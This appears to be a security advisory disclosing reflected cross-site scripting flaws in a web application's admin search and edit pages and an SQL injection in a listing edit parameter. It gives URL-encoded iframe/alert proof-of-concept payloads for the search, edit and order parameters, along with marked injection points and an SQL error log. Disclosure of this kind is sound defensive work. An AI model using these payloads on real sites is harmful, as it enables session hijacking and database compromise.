
Details:
========
The vulnerability allows remote attackers to hijack website customer, moderator or admin sessions with medium or high required user inter 
action. The bugs are located on client side in the search and edit module with the bound vulnerable id, search or order parameters. 
Exploitation requires medium or high user inter action & without privileged web application user account.

Vulnerable Module(s):
        [+] Search
        [+] Page&Edit

Vulnerable Parameter(s):
        [+] search
        [+] id
        [+] order


Proof of Concept:
=================
The non persistent cross site scripting vulnerabilities can be exploited by remote attackers with medium or high required user inter action 
and without privileged user account. For demonstration or reproduce ...

PoC:
?page=images&p=0&search=%22%3E%3Ciframe+src%3Dhttp%3A%2F%2Fvuln-lab.com+width%3D800+height%3D800onload%3Dalert%28%22VLAB%22%29+%3C

?page=emails&edit=%22%3E%3Ciframe+src%3Dhttp%3A%2F%2Fvuln-lab.com+width%3D800+height%3D800onload%3Dalert%28%22VLAB%22%29+%3C

?page=members&edit&order=0%22%3E%3Ciframe+src%3Dhttp%3A%2F%2Fvuln-lab.com+width%3D800+height%3D800onload%3Dalert%28%22VLAB%22%29+%3C


Review: File Manager

<fieldset style="padding:0px;">
<h2 style="float:left; padding-left:5px;">"><[CLIENT SIDE MALICIOUS SCRIPT CODE])" width="800">
<form method="get" name="SearchForm" action="admin.php" 
style="padding:5px; float:right;">
<input type="hidden" name="page" value="images" />
<input type="hidden" name="p" value="0" />
<input name="search" type="text" class="ppt-forminput" 
id="search">
<input type="submit" style="font-size:16px; background:#efefef; 
color:#666;padding:5px;" value="Search Files">
</form>
<div class="clearfix"></div>
<form class="plain" method="post" name="orderform" id="orderform">
<input type="hidden" name="deleteimages" value="1">
      
   
Review: Member Add/Edit Listing

<ul>
<li><a href="#" onclick="window.location.href=&#039;admin.php
?page=orders&cid=5"><[CLIENT SIDE MALICIOUS SCRIPT CODE])" 
width="800">Order History</a></li>
<!--<li><a href="admin.php?page=members">Search Results</a></li>-->
</ul>
</div>
<div id="videobox1"></div>
<form method="post" target="_self" enctype="multipart/form-data">
<input name="action" type="hidden" value="edit" />
<input name="userdata[ID]" type="hidden" value="5"><[CLIENT SIDE MALICIOUS SCRIPT CODE]") <" />
<input type="hidden" value="" name="showThisTab" id="showThisTab" />


Review: EMail Add/Edit

<form class="fields" method="post" target="_self" enctype="multipart/form-data">
<input name="action" value="edit" type="hidden">
<input name="ID" value="" 
type="hidden"><[CLIENT SIDE MALICIOUS SCRIPT CODE];)" width="800">
<input type="hidden" name="form[email_type]" value="email" />
<fieldset>
<div class="titleh"><h3>Email Options</h3></div>


Solution:
=========
The vulnerability can be patched by parsing the orders, id & search web application parameters.


Risk:
=====
The security risk of the non persistent cross site scripting vulnerabilities are estimated as medium(-).

Details:
========
Remote attackers with privileged user accounts & module access can execute/inject own sql commands to compromise 
id parameter. Exploitation requires privileged user account or module access rights.

Vulnerable Module(s):
        [+] Listing - [Edit]

Vulnerable Parameter(s):    
        [+] ID


Proof of Concept:
=================

PoC:

--- SQL Exception Logs ---
 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right 
syntax to use near &#039;[SQL-INJECTION!]&#039; GROUP BY order_id LIMIT 1&#039; at line 1 on line: 80


Solution:
=========
The vulnerability can be patched by parsing the id parameter of the edit functions in the addon module files.


Risk:
=====
The security risk of the sql injection vulnerability is estimated as high(-).



